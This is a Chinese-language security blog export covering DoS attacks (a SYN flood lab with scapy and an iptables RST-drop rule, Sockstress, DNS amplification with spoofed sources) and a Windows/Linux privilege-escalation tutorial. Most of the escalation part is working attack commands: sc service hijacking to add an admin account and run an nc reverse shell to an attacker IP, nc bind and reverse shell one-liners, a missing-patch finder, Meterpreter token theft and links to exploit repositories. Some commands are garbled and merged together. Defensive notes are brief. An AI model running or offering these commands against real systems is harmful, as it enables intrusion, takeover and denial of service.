<h1 id="Dos分类"><a href="#Dos分类" class="headerlink" title="Dos分类"></a>Dos分类</h1><p><strong>D网络</strong><br>基于巨量的Flood耗尽目标网络带宽资源<br>如：ICMP Flood, UDP Flood</p>
<p><strong>D协议</strong><br>攻击协议漏洞发起的拒绝服务攻击<br>如：Syn Flood、Ping of Death、ARP、DNS、802.11、SSL</p>
<p><strong>D应用</strong><br>针对应用软件和操作系统漏洞发起的拒绝服务攻击<br>大量频繁访问消耗系统资源严重的应用（CC)<br>通常表现为操作系统运行正常，网络流量不大，但服务停止响应<br>可以是一击毙命的，也可以是耗尽目标资源的<br>以上分类并不严谨，不必太过执着于此</p>
<p><img src="/image/DDos/1.jpg"></p>
<p>总结</p>
<h2 id="从攻击者到被害者流程"><a href="#从攻击者到被害者流程" class="headerlink" title="从攻击者到被害者流程"></a>从攻击者到被害者流程</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网络-&gt;FW-&gt;服务器OS-&gt;服务应用</span><br></pre></td></tr></table></figure>

<h2 id="资源耗尽型攻击方面"><a href="#资源耗尽型攻击方面" class="headerlink" title="资源耗尽型攻击方面"></a>资源耗尽型攻击方面</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网络：带宽</span><br><span class="line">FW:吞吐量、并发连接</span><br><span class="line">服务器：CPU、内存、I&#x2F;O</span><br><span class="line">应用：处理请求能力，对</span><br><span class="line">OS资源的使用权</span><br></pre></td></tr></table></figure>

<h2 id="程序漏洞攻击"><a href="#程序漏洞攻击" class="headerlink" title="程序漏洞攻击"></a>程序漏洞攻击</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">缓冲区溢出</span><br><span class="line">协议、程序逻辑漏洞     </span><br></pre></td></tr></table></figure>

<h1 id="攻击原理与攻击危害"><a href="#攻击原理与攻击危害" class="headerlink" title="攻击原理与攻击危害"></a><strong>攻击</strong>原理与<strong>攻击</strong>危害</h1><p>按照<strong>攻击</strong>对象的不同，将<strong>攻击</strong>原理和<strong>攻击</strong>危害的分析分成3类，分别是<strong>攻击</strong>网络带宽资源、应用以及系统。</p>
<h1 id="攻击网络带宽资源："><a href="#攻击网络带宽资源：" class="headerlink" title="攻击网络带宽资源："></a><strong>攻击</strong>网络带宽资源：</h1><p><img src="/image/DDos/2.jpg"></p>
<p>攻击网络带宽资源</p>
<h2 id="攻击系统资源："><a href="#攻击系统资源：" class="headerlink" title="攻击系统资源："></a>攻击<strong>系统资源：</strong></h2><p><img src="/image/DDos/3.jpg"></p>
<p>攻击系统资源</p>
<h2 id="攻击应用资源："><a href="#攻击应用资源：" class="headerlink" title="攻击应用资源："></a><strong>攻击</strong>应用资源：</h2><p><img src="/image/DDos/4.jpg"></p>
<p>攻击应用资源</p>
<h1 id="SYN-FLOOD攻击"><a href="#SYN-FLOOD攻击" class="headerlink" title="SYN FLOOD攻击"></a>SYN FLOOD攻击</h1><blockquote>
<p>利用服务器的连接缓冲区（Backlog Queue），利用特殊的程序，设置TCP的Header，向服务器端不断地成倍发送只有SYN标志的TCP连接请求。当服务器接收的时候，都认为是没有建立起来的连接请求，于是为这些请求建立会话，排到缓冲区队列中。</p>
</blockquote>
<blockquote>
<p>如果你的SYN请求超过了服务器能容纳的限度，缓冲区队列满，那么服务器就不再接收新的请求了。其他合法用户的连接都被拒绝掉。可以持续你的SYN请求发送，直到缓冲区中都是你的只有SYN标记的请求。</p>
</blockquote>
<p>最通俗的例子，下面的图片是TCP的通信的三次握手，如果说攻击端，发送完第一次握手的数据后，然后就“消失”了，那么服务器就会不断的发送第二次握手的数据，可是攻击端的人找不到了。于是，服务器的资源大量被消耗，直到死机为止。当然要完全弄懂机制，需要对TCP有相当深入的了解。</p>
<blockquote>
<p>TCP建立连接：三次握手<br>1.client: syn<br>2.server: syn+ack<br>3.client: ack</p>
</blockquote>
<p><img src="/image/DDos/5.jpg"></p>
<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>基于python2.7版本</p>
<p><img src="/image/DDos/6.jpg"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#apt-get install python-gnuplot 安装scapy相关组件</span><br></pre></td></tr></table></figure>

<p>然后使用攻击脚本攻击脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;syn_flood.py -iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 1.1.1.1 -j DROP -netstat -n I awk ‘&#x2F;^ tcp&#x2F; &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;‘</span><br></pre></td></tr></table></figure>

<p>Windows系统默认半开连接数10个<br>使用方法：</p>
<blockquote>
<p>– i=IP()           定义i变量（注意IP大小写，一定要大写）<br>– i.display()       显示ip包头用法<br>– i.dst=”1.1.1.1”       目的地址<br>– t=TCP()       采用tcp协议发包<br>– t.display ()      查看用法<br>– t.dport=3389  攻击远程3389端口<br>– sr1(i/t,verbose=1,timeout=3)          发送数据包（）<br>– sr1(IP(dst=1.1.1.1)/TCP())</p>
</blockquote>
<p><img src="/image/DDos/7.jpg"></p>
<p>当出现这种情况时</p>
<p>我们发一个包释放一个连接，这种达不到攻击郊果。要构成攻击效果可以通过iptables限止发送RST包。这样就可以达到攻击郊果。iptables写法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.21.117 -j DROP</span><br></pre></td></tr></table></figure>

<p><img src="/image/DDos/8.jpg"></p>
<p>重新发包会发现</p>
<h1 id="SYN-Flood防御"><a href="#SYN-Flood防御" class="headerlink" title="SYN Flood防御"></a>SYN Flood防御</h1><p>前文描述过，SYN Flood攻击大量消耗服务器的CPU、内存资源，并占满SYN等待队列。相应的，我们修改内核参数即可有效缓解。主要参数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net.ipv4.tcp_syncookies &#x3D; 1</span><br><span class="line"></span><br><span class="line">net.ipv4.tcp_max_syn_backlog &#x3D; 8192</span><br><span class="line"></span><br><span class="line">net.ipv4.tcp_synack_retries &#x3D; 2</span><br></pre></td></tr></table></figure>

<p>分别为启用SYN Cookie、设置SYN最大队列长度以及设置SYN+ACK最大重试次数。</p>
<blockquote>
<p>SYN Cookie的作用是缓解服务器资源压力。启用之前，服务器在接到SYN数据包后，立即分配存储空间，并随机化一个数字作为SYN号发送SYN+ACK数据包。然后保存连接的状态信息等待客户端确认。启用SYN Cookie之后，服务器不再分配存储空间，而且通过基于时间种子的随机数算法设置一个SYN号，替代完全随机的SYN号。发送完SYN+ACK确认报文之后，清空资源不保存任何状态信息。直到服务器接到客户端的最终ACK包，通过Cookie检验算法鉴定是否与发出去的SYN+ACK报文序列号匹配，匹配则通过完成握手，失败则丢弃。当然，前文的高级攻击中有SYN混合ACK的攻击方法，则是对此种防御方法的反击，其中优劣由双方的硬件配置决定</p>
</blockquote>
<blockquote>
<p>tcp_max_syn_backlog则是使用服务器的内存资源，换取更大的等待队列长度，让攻击数据包不至于占满所有连接而导致正常用户无法完成握手。net.ipv4.tcp_synack_retries是降低服务器SYN+ACK报文重试次数，尽快释放等待资源。这三种措施与攻击的三种危害一一对应，完完全全地对症下药。但这些措施也是双刃剑，可能消耗服务器更多的内存资源，甚至影响正常用户建立TCP连接，需要评估服务器硬件资源和攻击大小谨慎设置。</p>
</blockquote>
<blockquote>
<p>除了定制TCP/IP协议栈之外，还有一种常见做法是TCP首包丢弃方案，利用TCP协议的重传机制识别正常用户和攻击报文。当防御设备接到一个IP地址的SYN报文后，简单比对该IP是否存在于白名单中，存在则转发到后端。如不存在于白名单中，检查是否是该IP在一定时间段内的首次SYN报文，不是则检查是否重传报文，是重传则转发并加入白名单，不是则丢弃并加入黑名单。是首次SYN报文则丢弃并等待一段时间以试图接受该IP的SYN重传报文，等待超时则判定为攻击报文加入黑名单。</p>
</blockquote>
<p>首包丢弃方案对用户体验会略有影响，因为丢弃首包重传会增大业务的响应时间，有鉴于此发展出了一种更优的TCP Proxy方案。所有的SYN数据报文由清洗设备接受，按照SYN Cookie方案处理。和设备成功建立了TCP三次握手的IP地址被判定为合法用户加入白名单，由设备伪装真实客户端IP地址再与真实服务器完成三次握手，随后转发数据。而指定时间内没有和设备完成三次握手的IP地址，被判定为恶意IP地址屏蔽一定时间。除了SYN Cookie结合TCP Proxy外，清洗设备还具备多种畸形TCP标志位数据包探测的能力，通过对SYN报文返回非预期应答测试客户端反应的方式来鉴别正常访问和恶意行为。</p>
<p>清洗设备的硬件具有特殊的网络处理器芯片和特别优化的操作系统、TCP/IP协议栈，可以处理非常巨大的流量和SYN队列。</p>
<h1 id="Sockstress相应原理："><a href="#Sockstress相应原理：" class="headerlink" title="Sockstress相应原理："></a>Sockstress相应原理：</h1><p>放大攻击原理：攻击者向目标发送一个很小的流量，但是会造成产生的攻击流量是一个巨大的、成百上千倍上万倍流量被放大的一个效果，才适合作为一个拒绝服务攻击效果。（实现攻击者很小的流量打垮一个看似很大的被攻击者）</p>
<p>对于主题Sockstress主要作用即：建立了连接，但是不传数据，而且这个连接不会断开，占用资源，最后导致拒绝服务攻击<br>————————————————<br>Sockstress是2008年由Jack C. Louis发现的，其主要针对TCP服务的拒绝服务攻击<br>目的在于：消耗被攻击目标系统资源，但不消耗网络带宽资源，会产生大量TCP连接但不会产生大量流量；在与攻击目标建立大量socket链接；当完成三次握手、最后的ACK包window大小为0（客户端不接收数据）（再回数据的时候，客户端与服务器端都会各自相对方确认自己的空间大小，防止双方各自传送内容过大，主要是流控的作用）</p>
<p>对于攻击者的优势：</p>
<p>1、攻击者资源消耗小（CPU、内存、宽带）<br>2、异步攻击，单机可拒绝服务高配资源服务器</p>
<p>主要机理在于：window窗口实现的TCP流控（在第三次传送ACK包的时候出现）<br>：利用流控的攻击特性，造成攻击：攻击者将ACK包中的流控大小修改为0，然后促使ACK不停发向服务器，那么就会造成拒绝服务。在服务器看来就是客户端暂时没有空间来接受数据流量，所以服务器一直处于等待状态；但是攻击者只需要发完ACK包就行，不需要维持这么一个连接，所以对于攻击者就不会消耗巨量的CPU内存、带宽资源(以小搏大，放大)。</p>
<h1 id="Sockstress防范"><a href="#Sockstress防范" class="headerlink" title="Sockstress防范"></a>Sockstress防范</h1><blockquote>
<p>防御措施<br>-直到今天sockstress攻击仍然是一种很有效的DoS攻击方式 -甶于建立完整的TCP三步握手，因此使用syn cookie防御无效 -根本的防御方法是采用白名单（不实际）<br>-折中对策：限制单位时间内每IP建的TCP连接数<br>■封杀每30秒与80端口建立连接超过10个的IP地址<br>■iptables -I INPUT -p tcp –dport 80 -m state –state NEW -m recent –set<br>■ iptables -I INPUT -p tcp –dport 80 -m state –state NEW -m recent –update -¬seconds 30 –hitcount 10 -j DROP<br>■以上规则对DDoS攻击无效</p>
</blockquote>
<h1 id="DNS放大攻击"><a href="#DNS放大攻击" class="headerlink" title="DNS放大攻击"></a>DNS放大攻击</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">■产生大流量的攻击方法</span><br><span class="line">-单机的带宽优势 </span><br><span class="line">-巨大单机数量形成的流量汇聚</span><br><span class="line">-利用协议特性实现放大效果的流量</span><br><span class="line"></span><br><span class="line">■ DNS协议放大效果</span><br><span class="line">-查询请求流量小，但响应流量可能非常巨大</span><br><span class="line">-digANYhp.com @202.106.0.20 (流量放大约8倍）</span><br><span class="line"></span><br><span class="line">■攻击原理</span><br><span class="line">-伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询 </span><br><span class="line">-DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现DDoS</span><br></pre></td></tr></table></figure>

<p>Scapy构造攻击数据包<br>IP/UDP/DNS/DNS查询内容</p>
<p><img src="/image/DDos/9.jpg"></p>
<p>image.png</p>
<p>结合IP地址欺骗，利用大量DNS服务器做傀儡攻击目标</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>提权</title>
    <url>/2019/09/19/%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h1><p><img src="/image/%E8%84%91%E5%9B%BE/%E6%8F%90%E6%9D%83.png"></p>
<h1 id="window"><a href="#window" class="headerlink" title="window"></a>window</h1><h2 id="一、常见提权方法"><a href="#一、常见提权方法" class="headerlink" title="一、常见提权方法"></a>一、常见提权方法</h2><p>1、溢出漏洞提权</p>
<p>2、数据库提权</p>
<p>3、第三方软件提权</p>
<h2 id="二、Cmd命令无法执行原因分析"><a href="#二、Cmd命令无法执行原因分析" class="headerlink" title="二、Cmd命令无法执行原因分析"></a>二、Cmd命令无法执行原因分析</h2><h3 id="1、Cmd命令无法执行分析"><a href="#1、Cmd命令无法执行分析" class="headerlink" title="1、Cmd命令无法执行分析"></a>1、Cmd命令无法执行分析</h3><p>主要原因是cmd.exe被管理员降权或删除，也有可能组件被删除。</p>
<h3 id="2、Cmd命令执行解决方法"><a href="#2、Cmd命令执行解决方法" class="headerlink" title="2、Cmd命令执行解决方法"></a>2、Cmd命令执行解决方法</h3><p>通过脚本木马查找可读可写目录，上传cmd，调用cmd路径执行命令（找可读可写目录不要选带空格目录）。</p>
<p>setp c:\路径…\cmd.exe #切换至上传的cmd来执行命令</p>
<h2 id="三、提权常用命令讲解"><a href="#三、提权常用命令讲解" class="headerlink" title="三、提权常用命令讲解"></a>三、提权常用命令讲解</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami ——查看用户权限</span><br><span class="line">systeminfo ——查看操作系统，补丁情况</span><br><span class="line">ipconfig——查看当前服务器</span><br><span class="line">IPipconfig&#x2F;allnet user——查看当前用户情况</span><br><span class="line">netstat ——查看当前网络连接情况  </span><br><span class="line">netstat –ano&#x2F;netstat –an|find“ESTABLISHED”tasklist ——查看当前进程情况 </span><br><span class="line">tasklist&#x2F;svctaskkill ——结束进程 </span><br><span class="line">taskkill-PIDxxnet start  ——启动服务net stop ——停止服务</span><br></pre></td></tr></table></figure>

<p><strong>⚪微软官方时刻关注列表网址:</strong><br><a href="https://links.jianshu.com/go?to=https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017</a></p>
<p>比如常用的几个已公布的 exp：KB2592799KB3000061KB2592799</p>
<p><strong>🔴快速查找未打补丁的 exp，可以最安全的减少目标机的未知错误，以免影响业务。 命令行下执行检测未打补丁的命令如下：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo&gt;micropoor.txt&amp;(for%iin(KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780)do@typemicropoor.txt|@find&#x2F;i&quot;%i&quot;||@echo%i you can fuck)&amp;del&#x2F;f&#x2F;q&#x2F;a micropoor.txt</span><br></pre></td></tr></table></figure>

<p><strong>⛔一般实战中在类似 tmp 目录等可写目录下执行：如 C:\tmp&gt;</strong></p>
<p><strong>⚫目前已对外公开exp注：</strong></p>
<blockquote>
<p><a href="https://links.jianshu.com/go?to=https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
<p><a href="https://links.jianshu.com/go?to=https://github.com/WindowsExploits/Exploits">https://github.com/WindowsExploits/Exploits</a></p>
<p><a href="https://links.jianshu.com/go?to=https://github.com/AusJock/Privilege-Escalation">https://github.com/AusJock/Privilege-Escalation</a></p>
</blockquote>
<h2 id="四、溢出漏洞提权实战测试"><a href="#四、溢出漏洞提权实战测试" class="headerlink" title="四、溢出漏洞提权实战测试"></a>四、溢出漏洞提权实战测试</h2><h3 id="UAC介绍"><a href="#UAC介绍" class="headerlink" title="UAC介绍"></a>UAC介绍</h3><p>UAC（User Account Control）是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。<br>当前获得的权限是存在于管理员组的时候但是并且是administrator这个用户，此时就可能需要我们进行绕过UAC的操作，否则虽然是管理员组但是实际上并没有管理员所对应的高权限操作,这个时候就需要bypass uac</p>
<h3 id="windows-7、8、08、12、16"><a href="#windows-7、8、08、12、16" class="headerlink" title="windows 7、8、08、12、16"></a><strong>windows 7、8、08、12、16</strong></h3><p><strong>sc</strong>  <strong>命令提权（administrator–&gt;system）</strong></p>
<p>ps：经测试03也可以。</p>
<p>关于sc命令：</p>
<p>SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc Create syscmd binPath&#x3D; “cmd &#x2F;K start” type&#x3D; own type&#x3D; interact</span><br></pre></td></tr></table></figure>

<p>这个命令的意思是创建一个名叫syscmd的新的交互式的cmd服务然后执行<br>sc start systcmd，就得到了一个system权限的cmd环境</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/2.jpg"></p>
<p><strong>不带引号的服务路径</strong></p>
<meta charset="utf-8">

<p>Windows命令解释程序可能会遇到名称中的空格，并且没有包装在引号中的时候。就有可能出现解析漏洞，如下述路径，C:\Program Files\Vulnerable.exe中存在空格，此时在C盘根目录上传Program.exe文件时，就会被目标开机自启动。如果无效，还可以尝试在C:\Program Files路径下上传Vulnerable.exe文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Vulnerable.exe</span><br><span class="line">C:\Program Files\Vulnerable Service\Sub.exe</span><br><span class="line">C:\Program Files\Vulnerable Service\Sub Directory\service.exe</span><br></pre></td></tr></table></figure>

<p><strong>我们可以使用以下命令查看错误配置的路径</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<h4 id="4-4、利用不安全的服务权限"><a href="#4-4、利用不安全的服务权限" class="headerlink" title="4.4、利用不安全的服务权限"></a>4.4、利用不安全的服务权限</h4><p>即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它。<br><strong>AccessChk工具可以用来查找用户可以修改的服务：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">accesschk.exe -uwcqv “Authenticated Users” * &#x2F;accepteula</span><br><span class="line">accesschk.exe -uwcqv “user” *</span><br></pre></td></tr></table></figure>

<p><strong>sc命令也可以用来查找用户可以修改的服务：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc qc “Service”   #查找可以修改的服务</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc config PFNET binpath&#x3D; “net user rottenadmin P@ssword123! &#x2F;add”</span><br><span class="line">sc stop PFNET</span><br><span class="line">sc start PFNET</span><br></pre></td></tr></table></figure>

<p>每当我们开启服务时sc命令都返回了一个错误。这是因为net user命令没有指向二进制服务，因此SCM无法 与服务进行通信，通过使用执行自动迁移到新进程的payload，手动迁移进程，或者在执行后将服务的bin路径设置回原始服务二进制文件，可以解决这个问题。或者我们在权限允许的情况下，将我们的木马放到服务目录下，并重命名为服务启动的应用名称。电脑重启时即可获得一个system的shell</p>
<h5 id="完整案例："><a href="#完整案例：" class="headerlink" title="完整案例："></a>完整案例：</h5><p><strong>①、利用系统自带的 DcomLaunch服务测试(此服务Power User组低权可操作)</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">“sc qc DcomLaunch”命令查询DcomLaunch的详细信息</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start | find &quot;DCOM Server Process Launcher&quot;  查看服务是否启动</span><br></pre></td></tr></table></figure>

<p>运行 tasklist /svc 找到对应服务</p>
<p><strong>②、修改服务并获取系统权限</strong></p>
<p>这里要配置使用nc反弹shell到我的攻击机上，把nc放到c:\windows\temp目录下，使用sc对服务进行修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc config DcomLaunch binpath&#x3D; &quot;C:\wmpub\nc.exe -nv 192.168.32.194 4433 -e  C:\WINDOWS\system32\cmd.exe&quot;  </span><br></pre></td></tr></table></figure>

<p>⛔注意binpath=后面一定要有个空格，IP为攻击者IP</p>
<p><strong>③、查看是否第二步成功</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc qc DcomLaunch </span><br></pre></td></tr></table></figure>

<p><strong>④、配置账号密码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc config DcomLaunch obj&#x3D; &quot;.\LocalSystem&quot;  password&#x3D; &quot;&quot;</span><br></pre></td></tr></table></figure>

<p>obj:指定运行服务将使用的帐户名，或指定运行驱动程序将使用的 Windows 驱动程序对象名。默认设置为 LocalSystem。<br>password:指定一个密码。如果使用了非 LocalSystem 的帐户，则此项是必需的。</p>
<p><strong>⑤、重启服务</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start DcomLaunch </span><br></pre></td></tr></table></figure>

<p><strong>⑥、攻击机上用nc进行监听4433即可得到反弹的shell</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc.exe -vv -l -p 4433</span><br></pre></td></tr></table></figure>

<h4 id="4-5、计划任务"><a href="#4-5、计划任务" class="headerlink" title="4.5、计划任务"></a>4.5、计划任务</h4><p>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样在下次计划执行时，就会以高权限来运行恶意程序。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v    #查看计算机的计划任务</span><br><span class="line">accesschk.exe -dqv &quot;D:\test&quot; -accepteula   #查看指定目录的权限配置情况</span><br></pre></td></tr></table></figure>

<h4 id="4-6、Meterpreter基础提权"><a href="#4-6、Meterpreter基础提权" class="headerlink" title="4.6、Meterpreter基础提权"></a>4.6、Meterpreter基础提权</h4><p>首先在Meterpreter会话执行ps命令查看目标机当前进程：<br>假设此处看到了一个进程，运行账户是域管理员，我们可以再第一栏找到对应的进程PID，（实际我们这里找个任意的SYSTEM账户运行的进程），PID为2584：<br>然后我们可以执行以下语句窃取该用户进程的令牌：linux</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">steal_token  2584</span><br></pre></td></tr></table></figure>

<h2 id="五、溢出漏洞安全防范"><a href="#五、溢出漏洞安全防范" class="headerlink" title="五、溢出漏洞安全防范"></a>五、溢出漏洞安全防范</h2><hr>
<p><strong>🟣及时通过Windows Update或第三方工具360更新补丁</strong><br>在dos命令窗口输入systeminfo 命令回车，显示所有系统补丁相关信息</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/1.jpg"></p>
<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><p>当我们拿到了一台Linux服务器的低权限账号，于是，我们想要通过技术手段提权至 root 用户权限，以执行更多的操作。首先关于Linux提权我们得先明白几个概念。</p>
<h2 id="壹：linux发行版本"><a href="#壹：linux发行版本" class="headerlink" title="壹：linux发行版本"></a>壹：linux发行版本</h2><hr>
<p>是我们常说的Linux操作系统，也即是由Linux内核与各种常用软件的集合产品，全球大约有数百款的Linux系统版本，每个系统版本都有自己的特性和目标人群， 例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CentOS    社区企业版（服务器端）</span><br><span class="line">redhat    社区个人版</span><br><span class="line">ubuntu   （个人端）</span><br><span class="line">kali     （hacked）</span><br></pre></td></tr></table></figure>

<h2 id="贰：linux内核"><a href="#贰：linux内核" class="headerlink" title="贰：linux内核"></a>贰：linux内核</h2><hr>
<p>Linux系统内核指的是一个由Linus Torvalds负责维护，提供硬件抽象层、硬盘及文件系统控制及多任务功能的系统核心程序。<br><strong>Linux内核版本有两种：</strong>稳定版和开发版 ，Linux内核版本号由3组数字组成：第一个组数字.第二组数字.第三组数字</p>
<blockquote>
<p>第一个组数字：目前发布的内核主版本。<br>第二个组数字：偶数表示稳定版本；奇数表示开发中版本。<br>第三个组数字：错误修补的次数。</p>
</blockquote>
<p>使用 uname -r 可以看到linux系统的发行版本号。3.10.0就是内核版本号。3就是内核主版本，10表示是稳定版，0表示错误修补次数是0。 而 123.el7.x86_64则是 redhat 的发行版本信息，123 代表编译123次，el7代表的是redhat7，x86_64则是64位系统。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">或者使用以下命令也可以看到系统内核及版本的一些信息：</span><br><span class="line">uname -a                 #查看内核的具体信息</span><br><span class="line">cat &#x2F;proc&#x2F;version        #查看内核的具体信息</span><br><span class="line">cat &#x2F;etc&#x2F;centos-release  #查看centos发行版本</span><br><span class="line">cat &#x2F;etc&#x2F;redhat-release  #查看redhat发行版本</span><br></pre></td></tr></table></figure>

<h2 id="叁：Linux开启apache服务"><a href="#叁：Linux开启apache服务" class="headerlink" title="叁：Linux开启apache服务"></a>叁：Linux开启apache服务</h2><hr>
<p>在终端输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">“vim &#x2F;etc&#x2F;apache2&#x2F;ports.conf” -&gt; </span><br></pre></td></tr></table></figure>

<p>键盘输入i 进入插入编辑模式 -&gt; 修改apache2默认监听端口号为8080 -&gt; 编辑好后，按Esc键+“：wq” 保存退出 -&gt; 在终端输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">“&#x2F;etc&#x2F;init.d&#x2F;apache2 start”</span><br></pre></td></tr></table></figure>

<h2 id="肆：Linux提权的前提："><a href="#肆：Linux提权的前提：" class="headerlink" title="肆：Linux提权的前提："></a>肆：Linux提权的前提：</h2><hr>
<blockquote>
<p>拿到了一个低权限的账号<br>能上传和下载文件<br>机器上有python、java、perl等环境（非必须项）</p>
</blockquote>
<h2 id="伍：Linux常用渗透命令学习"><a href="#伍：Linux常用渗透命令学习" class="headerlink" title="伍：Linux常用渗透命令学习"></a>伍：Linux常用渗透命令学习</h2><hr>
<blockquote>
<p>死记硬背以下12类命令：系统信息查看类、文件目录类、驱动挂载类、程序安装类、源代码包安装、压缩解压类、进程控制类、程序运行类、用户帐号类、vi编辑类、网络服务、其他类等。</p>
<p>详情参考：Linux常用渗透命令篇</p>
</blockquote>
<h2 id="陆：Linux提权方法总结"><a href="#陆：Linux提权方法总结" class="headerlink" title="陆：Linux提权方法总结"></a>陆：Linux提权方法总结</h2><h4 id="一、Linux反弹提权"><a href="#一、Linux反弹提权" class="headerlink" title="一、Linux反弹提权"></a>一、Linux反弹提权</h4><p><strong>如果手里只有webshell可以利用反弹shell来得到一个shell</strong></p>
<h5 id="1、首先得有一个netcat"><a href="#1、首先得有一个netcat" class="headerlink" title="1、首先得有一个netcat"></a>1、首先得有一个netcat</h5><p><strong>🟩简单介绍一下netcat</strong></p>
<blockquote>
<p>功能强大的网络工具，在网络工具中有“瑞士军刀”美誉，其有Windows和Linux的版本。因为它短小精悍,功能实用，被设计为一个简单、可靠的网络工具，可通过TCP或UDP协议传输读写数据。同时，它还是一个网络应用Debug分析器，因为它可以根据需要创建各种不同类型的网络连接。<br><strong>详情参考：</strong><a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/nmap/p/6148306.html">https://www.cnblogs.com/nmap/p/6148306.html</a></p>
</blockquote>
<p><strong>①netcat参数介绍</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1) -l            用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。</span><br><span class="line">2) -p &lt;port&gt;     暂未用到（老版本的nc可能需要在端口号前加-p参数，下面测试环境是centos6.6，nc版本是nc-1.84，未用到-p参数）</span><br><span class="line">3) -s            指定发送数据的源IP地址，适用于多网卡机</span><br><span class="line">4) -u             指定nc使用UDP协议，默认为TCP</span><br><span class="line">5) -v            输出交互或出错信息，新手调试时尤为有用</span><br><span class="line">6）-w            超时秒数，后面跟数字</span><br><span class="line">7）-z            表示zero，表示扫描时不发送任何数据</span><br></pre></td></tr></table></figure>

<p><strong>②nc用法介绍 1——tcp监听</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc nc -l -p 8080      开启本地8080端口监听</span><br></pre></td></tr></table></figure>

<p><strong>③nc用法介绍 2——反弹服务器shell</strong></p>
<p><strong>方法⑴：</strong>REMOTE主机绑定SHELL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在公网监听</span><br><span class="line">nc -l -p 5354 -t -e c:\winnt\system32\cmd.exe</span><br><span class="line">或者</span><br><span class="line">nc -l -p 5555 -t -e cmd.exe</span><br><span class="line">在内网主动建立连接</span><br><span class="line">nc -nvv 192.168.153.138 5555</span><br></pre></td></tr></table></figure>

<p><strong>讲解：</strong>-t是通过telne模式执行 cmd.exe 程序，可以省略。<br>绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口</p>
<p><strong>方法⑵：</strong>REMOTE主机绑定SHELL并反向连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在公网监听</span><br><span class="line">nc -lp 5555</span><br><span class="line">在内网机器反弹</span><br><span class="line">nc -t -e c:\winnt\system32\cmd.exe 192.168.x.x 5354</span><br><span class="line">或者</span><br><span class="line">nc -t -e cmd 192.168.153.140 5555</span><br></pre></td></tr></table></figure>

